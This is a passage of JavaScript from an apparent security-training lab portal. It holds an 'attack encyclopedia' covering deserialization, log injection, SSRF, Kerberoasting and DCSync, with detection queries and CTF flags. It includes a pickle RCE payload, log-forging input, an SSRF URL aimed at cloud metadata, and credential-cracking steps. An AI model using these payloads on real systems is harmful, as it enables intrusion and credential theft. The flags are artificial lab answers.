          "security.session.fixated_id": "attacker-controlled-123"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.session.fixated_id'] as FixatedID where SpanAttribute['security.session.fixated_id'] != ''",
          explanation: "Filter for spans with the security.session.fixated_id attribute. Any non-empty value indicates a session fixation attempt. The fixated ID shows the attacker's pre-set session token."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'auth_bypass' | where security_session_fixated_id != '' | stats count by security_source_ip",
          explanation: "Session fixation attempts from the same IP indicate a targeted attack. Correlate the fixated session ID with subsequent authenticated sessions to identify hijacking."
        },
        flag: "FLAG{S3SS10N_F1X4T10N_4TT4CK}"
      }
    ]
  },

  // ── OWASP A08: Software and Data Integrity Failures ───
  "A08": {
    title: "A08:2021 — Software and Data Integrity Failures",
    icon: "&#128163;",
    summary: "Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes insecure deserialization, unsigned software updates, and CI/CD pipeline manipulation.",
    attacks: [
      {
        id: "pickle-rce",
        name: "Insecure Deserialization — Python Pickle RCE",
        severity: "critical",
        endpoint: "/portal/api/import/profile",
        mitre: { id: "T1059", tactic: "Execution", technique: "Command and Scripting Interpreter" },
        description: "The profile import endpoint deserializes base64-encoded Python pickle data without validation. Python's pickle module can execute arbitrary code during deserialization via the __reduce__ method.",
        howItWorks: [
          "Application accepts profile data as base64-encoded pickle",
          "Python's pickle.loads() reconstructs objects from the serialized data",
          "Pickle's __reduce__ method can specify arbitrary functions to call during deserialization",
          "Attacker crafts pickle payload: class Exploit: def __reduce__(self): return (os.system, ('id',))",
          "When server deserializes: pickle.loads(payload) → os.system('id') executes",
          "Attacker achieves full Remote Code Execution on the server"
        ],
        examplePayload: "POST /portal/api/import/profile?data=<base64-encoded-pickle-with-__reduce__>",
        realWorldImpact: "Python pickle deserialization vulnerabilities have been found in major ML platforms (MLflow CVE-2023-6831), data pipelines, and caching systems. Never unpickle data from untrusted sources.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "deserialization",
          "security.deserialization.format": "python_pickle"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as Payload where SpanAttribute['security.attack.type'] = 'deserialization'",
          explanation: "Filter for deserialization attack type. The security.deserialization.format attribute identifies the serialization format used (python_pickle, java_serialization, etc.). Any pickle deserialization of user data should be flagged."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'deserialization' | stats count by security_source_ip",
          explanation: "Deserialization attacks are always deliberate — no legitimate user sends pickle payloads via web forms. Every attempt should trigger an investigation."
        },
        flag: "FLAG{D3S3R14L1Z4T10N_RC3}"
      }
    ]
  },

  // ── OWASP A09: Security Logging & Monitoring Failures ──
  "A09": {
    title: "A09:2021 — Security Logging and Monitoring Failures",
    icon: "&#128221;",
    summary: "Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response allows attackers to operate undetected.",
    attacks: [
      {
        id: "silent-transfer",
        name: "Silent Transfer — Missing Security Instrumentation",
        severity: "high",
        endpoint: "/portal/api/silent/transfer",
        mitre: { id: "T1562", tactic: "Defense Evasion", technique: "Impair Defenses" },
        description: "This endpoint processes financial transfers with intentionally minimal logging. Unlike other endpoints that generate OpenTelemetry security spans, this one operates in the blind — demonstrating what happens when critical operations lack observability.",
        howItWorks: [
          "An attacker discovers the /silent/transfer endpoint",
          "Unlike /treasury/transfer, this endpoint has NO security span attributes",
          "Transfer of 999,999 gold is processed without OTel detection attributes",
          "Only transfers > 10,000 generate a basic log line (easily missed)",
          "Security team searching for 'security.attack.type' in APM finds nothing",
          "The transfer completes undetected — this IS the vulnerability"
        ],
        examplePayload: "GET /portal/api/silent/transfer?from_account=Crown&to_account=IronBank&amount=999999",
        realWorldImpact: "The SWIFT banking hack (Bangladesh Bank, 2016) succeeded partly because logging on the SWIFT terminal was disabled. The $81 million theft went unnoticed for days because monitoring gaps allowed transfers to proceed without alerts.",
        otelAttributes: {},
        apmDetection: {
          query: "— This is the point: there IS no APM query that catches this. The endpoint intentionally lacks security instrumentation. To find it, look for HTTP spans to /silent/transfer that have NO security.attack.* attributes.",
          explanation: "The absence of detection IS the vulnerability. In OCI APM, you can search for HTTP request spans to /api/silent/transfer and notice they lack the security.* attributes present on all other financial endpoints. Detection gap analysis is critical."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where URI like '%/silent/transfer%' | stats count as silent_count by security_source_ip | where silent_count > 0",
          explanation: "Search for HTTP access logs to the silent/transfer path. Since the endpoint doesn't set security attributes, you must detect it at the HTTP request level rather than the security event level. This demonstrates why comprehensive instrumentation matters."
        },
        flag: null
      },
      {
        id: "log-injection",
        name: "Log Injection — Log Entry Forgery",
        severity: "medium",
        endpoint: "/portal/api/log-injection?msg=",
        mitre: { id: "T1070", tactic: "Defense Evasion", technique: "Indicator Removal" },
        description: "User input is written directly to application logs without sanitization. Newline characters (\\n, %0a) allow the attacker to inject fake log entries, potentially covering their tracks or triggering false alerts.",
        howItWorks: [
          "Application logs user actions: log.info(f'User action: {user_input}')",
          "Attacker includes newline in input: 'login successful\\nWARNING: Admin access granted'",
          "The \\n creates a new log line that appears to be a legitimate system message",
          "Security team sees 'Admin access granted' in logs and may ignore real intrusion",
          "Attacker can forge 'Login successful' entries to mask failed brute force attempts",
          "Log analytics tools parse the injected entries as real events"
        ],
        examplePayload: "GET /portal/api/log-injection?msg=INFO Login successful user=admin%0aWARNING Access granted",
        realWorldImpact: "Log injection is used to cover tracks during intrusions. OWASP lists it under 'Log Forging'. When combined with Log4Shell-style vulnerabilities, log injection can escalate to RCE.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "log_injection",
          "security.log.injected_content": "<injected log line>"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as InjectedLog where SpanAttribute['security.attack.type'] = 'log_injection'",
          explanation: "Filter for log_injection attack type. The payload shows what the attacker tried to inject into the logs. Compare injected content with actual log entries to identify forgeries."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'log_injection' | stats count by security_source_ip",
          explanation: "Track log injection attempts by source IP. These are defensive evasion techniques — the attacker is trying to manipulate your monitoring. Investigate what else the IP was doing around the same time."
        },
        flag: "FLAG{L0G_1NJ3CT10N_F0RG3RY}"
      }
    ]
  },

  // ── OWASP A10: Server-Side Request Forgery ────────────
  "A10": {
    title: "A10:2021 — Server-Side Request Forgery (SSRF)",
    icon: "&#127758;",
    summary: "SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. The attacker can force the application to send requests to internal services, cloud metadata APIs, or other backend systems.",
    attacks: [
      {
        id: "ssrf-imds",
        name: "SSRF — OCI Instance Metadata Access",
        severity: "critical",
        endpoint: "/portal/api/avatar/fetch?url=",
        mitre: { id: "T1090", tactic: "Command and Control", technique: "Proxy" },
        description: "The avatar fetch endpoint makes server-side HTTP requests to user-supplied URLs. By pointing it at the OCI Instance Metadata Service (IMDS at 169.254.169.254), an attacker can extract instance credentials, compartment info, and SSH keys.",
        howItWorks: [
          "Application has an avatar URL feature that fetches images from external URLs",
          "Server-side: requests.get(user_provided_url) — no URL validation",
          "Attacker provides: http://169.254.169.254/opc/v2/instance/",
          "Server makes the request FROM INSIDE the cloud network",
          "OCI IMDS returns: instance OCID, compartment, availability domain, SSH keys",
          "With instance principal auth, the IMDS may expose IAM credentials for cloud API access"
        ],
        examplePayload: "GET /portal/api/avatar/fetch?url=http://169.254.169.254/opc/v2/instance/",
        realWorldImpact: "The Capital One breach (2019, 106 million records) was caused by SSRF to AWS IMDS. The attacker used a misconfigured WAF to reach http://169.254.169.254/iam/security-credentials/ and extract IAM role credentials. This led to AWS adding IMDSv2 with mandatory session tokens.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "ssrf",
          "security.attack.severity": "critical",
          "http.url": "http://169.254.169.254/opc/v2/instance/",
          "security.ssrf.target_internal": "true",
          "security.ssrf.target_type": "cloud_metadata"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as TargetURL where SpanAttribute['security.attack.type'] = 'ssrf'",
          explanation: "Filter for ssrf attack type. The security.ssrf.target_type attribute distinguishes between 'cloud_metadata' (IMDS access — most critical), 'internal_network' (lateral movement), and external SSRF. Any IMDS access attempt is a critical incident."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'ssrf' | where security_attack_payload like '%169.254%' or security_attack_payload like '%127.0.0%' or security_attack_payload like '%10.0.%' | stats count by security_attack_payload, security_source_ip",
          explanation: "Hunt for SSRF targeting internal IP ranges and cloud metadata. The 169.254.169.254 address is the cloud metadata service (OCI, AWS, GCP, Azure). Internal IPs (10.x, 192.168.x, 172.16-31.x) indicate lateral movement attempts."
        },
        flag: "FLAG{55RF_1NT3RN4L_4CC355}"
      }
    ]
  },

  // ── GOAD Active Directory Attacks ─────────────────────
  "GOAD": {
    title: "GOAD — Active Directory Attacks",
    icon: "&#127984;",
    summary: "These attacks target the Game of Active Directory (GOAD) lab infrastructure — three interconnected AD domains (sevenkingdoms.local, north.sevenkingdoms.local, essos.local) with realistic misconfigurations.",
    attacks: [
      {
        id: "kerberoasting",
        name: "Kerberoasting — TGS Ticket Extraction",
        severity: "critical",
        endpoint: "/portal/api/goad/kerberoast",
        mitre: { id: "T1558.003", tactic: "Credential Access", technique: "Kerberoasting" },
        description: "Kerberoasting exploits the Kerberos authentication protocol to extract service account password hashes. Any domain user can request a Ticket Granting Service (TGS) ticket for any service, and the ticket is encrypted with the service account's password hash — which can be cracked offline.",
        howItWorks: [
          "Attacker authenticates to the domain as any user (e.g., via LDAP injection)",
          "Attacker enumerates Service Principal Names (SPNs) in Active Directory",
          "Attacker requests a TGS ticket for MSSQLSvc/castelblack.north.sevenkingdoms.local",
          "Domain controller returns a ticket encrypted with the MSSQL service account's NTLM hash",
          "Attacker extracts the ticket and runs hashcat -m 13100 (Kerberos 5 TGS-REP)",
          "If the service account has a weak password, it cracks in minutes → domain compromise"
        ],
        examplePayload: "GET /portal/api/goad/kerberoast?spn=MSSQLSvc/castelblack.north.sevenkingdoms.local",
        realWorldImpact: "Kerberoasting is one of the most common Active Directory attack techniques. Microsoft's 2023 Digital Defense Report identified it in 40% of red team engagements. Service accounts with weak passwords are the #1 path to domain admin.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "auth_bypass",
          "security.attack.mitre_id": "T1558.003",
          "security.attack.mitre_name": "Kerberoasting",
          "security.kerberos.spn": "MSSQLSvc/castelblack.north.sevenkingdoms.local",
          "security.kerberos.ticket_type": "TGS",
          "security.kerberos.encryption": "RC4_HMAC_MD5"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.attack.payload'] as SPN where SpanName like 'ATTACK:KERBEROAST%'",
          explanation: "Filter APM traces for KERBEROAST span names. The security.kerberos.spn attribute reveals which service account is being targeted. RC4_HMAC_MD5 encryption (instead of AES) makes tickets significantly easier to crack."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where SpanName like '%KERBEROAST%' | stats count by security_source_ip",
          explanation: "Correlate Kerberoasting APM traces with Windows Event ID 4769 (Kerberos Service Ticket Operations) from GOAD domain controllers. Multiple TGS requests for different SPNs from the same source indicate systematic Kerberoasting."
        },
        flag: "FLAG{K3RB3R04ST_T1CK3T}"
      },
      {
        id: "dcsync",
        name: "DCSync — Domain Controller Replication Attack",
        severity: "critical",
        endpoint: "/portal/api/goad/dcsync?target=",
        mitre: { id: "T1003.006", tactic: "Credential Access", technique: "DCSync" },
        description: "DCSync abuses the Directory Replication Service (DRS) protocol to impersonate a domain controller and request password hashes for any account. With the Administrator or krbtgt hash, the attacker achieves complete domain compromise.",
        howItWorks: [
          "Attacker compromises an account with Replicating Directory Changes permissions",
          "Attacker uses Mimikatz or impacket's secretsdump to initiate DRS replication",
          "The target DC receives what appears to be a legitimate replication request",
          "DC responds with the NTLM hash for the requested account (e.g., Administrator)",
          "With the Administrator hash: Pass-the-Hash for domain admin access",
          "With the krbtgt hash: forge Golden Tickets for unlimited, persistent domain access"
        ],
        examplePayload: "GET /portal/api/goad/dcsync?target=Administrator",
        realWorldImpact: "DCSync is a key technique used by APT groups including APT29 (Cozy Bear/SolarWinds). The SolarWinds attackers used DCSync to extract the krbtgt hash and create Golden Tickets for persistent access across Microsoft's customer environments.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "credential_leak",
          "security.attack.mitre_id": "T1003.006",
          "security.attack.mitre_name": "DCSync",
          "security.dcsync.target_user": "Administrator",
          "security.dcsync.protocol": "MS-DRSR",
          "security.dcsync.domain": "sevenkingdoms.local"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name where SpanName like 'ATTACK:DCSYNC%'",
          explanation: "Filter for DCSYNC span names. The security.dcsync.target_user reveals which account hash is being extracted. Administrator and krbtgt are the highest-value targets. Any DCSync attempt is a critical incident."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where SpanName like '%DCSYNC%' | stats count by security_source_ip",
          explanation: "Correlate with Windows Event ID 4662 (Directory Service Access) where the access mask includes 'Replicating Directory Changes'. In GOAD, this also generates Windows Security Event 4624 (logon) from the replication source."
        },
        flag: "FLAG{DC5YNC_R3PL1C4T10N}"
      }
    ]
  }
};

// ── Encyclopedia Rendering ──────────────────────────────

function renderEncyclopedia() {
  const container = document.getElementById('encyclopedia-content');
  if (!container) return;

  let html = '';

  for (const [category, data] of Object.entries(ATTACK_ENCYCLOPEDIA)) {
    html += `
      <div class="enc-category" id="enc-${category}">
        <div class="enc-category-header" onclick="toggleCategory('${category}')">
          <span class="enc-icon">${data.icon}</span>
          <div class="enc-category-info">
            <h3>${data.title}</h3>
            <p>${escapeHtml(data.summary)}</p>
          </div>
          <span class="enc-count">${data.attacks.length} attack${data.attacks.length > 1 ? 's' : ''}</span>
          <span class="enc-chevron" id="chevron-${category}">&#9660;</span>
        </div>
        <div class="enc-attacks" id="attacks-${category}" style="display:none">
          ${data.attacks.map(attack => renderAttackEntry(attack)).join('')}
        </div>
      </div>
    `;
  }

  container.innerHTML = html;
}

function renderAttackEntry(attack) {
  const severityClass = attack.severity === 'critical' ? 'critical' : attack.severity === 'high' ? 'high' : 'medium';
  const otelRows = Object.entries(attack.otelAttributes || {}).map(([k, v]) =>
    `<tr><td><code>${k}</code></td><td><code>${v}</code></td></tr>`
  ).join('');

  return `
    <div class="enc-attack" id="attack-${attack.id}">
      <div class="enc-attack-header" onclick="toggleAttack('${attack.id}')">
        <div class="enc-attack-title">
          <span class="badge badge-${severityClass}">${attack.severity}</span>
          <h4>${attack.name}</h4>
        </div>
        <div class="enc-attack-tags">
          <span class="badge badge-mitre">${attack.mitre.id}</span>
          <code class="enc-endpoint">${attack.endpoint}</code>
          ${attack.flag ? '<span class="badge badge-flag">FLAG</span>' : ''}
        </div>
      </div>
      <div class="enc-attack-body" id="body-${attack.id}" style="display:none">
        <div class="enc-section">
          <h5>What is this attack?</h5>
          <p>${escapeHtml(attack.description)}</p>
        </div>

        <div class="enc-section">
          <h5>How it works — step by step</h5>
          <ol class="enc-steps">
            ${attack.howItWorks.map(step => `<li>${escapeHtml(step)}</li>`).join('')}
          </ol>
        </div>

        <div class="enc-section">
          <h5>Example payload</h5>
          <pre class="enc-code">${escapeHtml(attack.examplePayload)}</pre>
          <button class="btn btn-outline enc-try-btn" onclick="tryAttack('${attack.endpoint}')">
            Try this attack
          </button>
        </div>

        <div class="enc-section">
          <h5>Real-world impact</h5>
          <p class="enc-impact">${escapeHtml(attack.realWorldImpact)}</p>
        </div>

        <div class="enc-section">
          <h5>MITRE ATT&CK Mapping</h5>
          <div class="enc-mitre">
            <div class="enc-mitre-item"><span class="enc-label">Technique</span> <span>${attack.mitre.id} — ${attack.mitre.technique}</span></div>
            <div class="enc-mitre-item"><span class="enc-label">Tactic</span> <span>${attack.mitre.tactic}</span></div>
          </div>
        </div>

        ${otelRows ? `
        <div class="enc-section">
          <h5>OpenTelemetry Span Attributes</h5>
          <p class="enc-note">These attributes are set on each APM trace span when this attack is detected. They power the detection queries below.</p>
          <table class="enc-table">
            <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
            <tbody>${otelRows}</tbody>
          </table>
        </div>
        ` : `
        <div class="enc-section">
          <h5>OpenTelemetry Span Attributes</h5>
          <div class="enc-warning">No security attributes are set — this IS the vulnerability. The absence of instrumentation means this attack goes undetected in APM.</div>
        </div>
        `}

        <div class="enc-detection-grid">
          <div class="enc-detection-card">
            <div class="enc-detection-header">
              <span class="enc-detection-icon">&#128269;</span>
              <h5>Detect in OCI APM</h5>
            </div>
            <pre class="enc-query">${escapeHtml(attack.apmDetection.query)}</pre>
            <button class="query-copy-btn" onclick="copyEncQuery(this, ${JSON.stringify(JSON.stringify(attack.apmDetection.query))})">Copy APM Query</button>
            <p class="enc-detection-explain">${escapeHtml(attack.apmDetection.explanation)}</p>
          </div>
          <div class="enc-detection-card">
            <div class="enc-detection-header">
              <span class="enc-detection-icon">&#128200;</span>
              <h5>Detect in OCI Log Analytics</h5>
            </div>
            <pre class="enc-query">${escapeHtml(attack.laDetection.query)}</pre>
            <button class="query-copy-btn" onclick="copyEncQuery(this, ${JSON.stringify(JSON.stringify(attack.laDetection.query))})">Copy LA Query</button>
            <p class="enc-detection-explain">${escapeHtml(attack.laDetection.explanation)}</p>
          </div>
        </div>

        ${attack.flag ? `
        <div class="enc-flag">
          <span class="flag-highlight">${attack.flag}</span>
        </div>
        ` : ''}
      </div>
    </div>
  `;
}

function escapeHtml(text) {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function toggleCategory(category) {
  const el = document.getElementById('attacks-' + category);
  const chevron = document.getElementById('chevron-' + category);
  if (!el) return;
  const open = el.style.display !== 'none';
  el.style.display = open ? 'none' : 'block';
  if (chevron) chevron.innerHTML = open ? '&#9660;' : '&#9650;';
}

function toggleAttack(id) {
  const el = document.getElementById('body-' + id);
  if (!el) return;
  el.style.display = el.style.display === 'none' ? 'block' : 'none';
}

function tryAttack(endpoint) {
  // Switch to dashboard tab and trigger the attack
  switchTab('dashboard');
  // Simple GET for demo
  if (typeof apiCall === 'function') {
    apiCall(endpoint);
  }
}

function copyEncQuery(btn, query) {
  navigator.clipboard.writeText(query).then(() => {
    const orig = btn.textContent;
    btn.textContent = 'Copied!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
  });
}
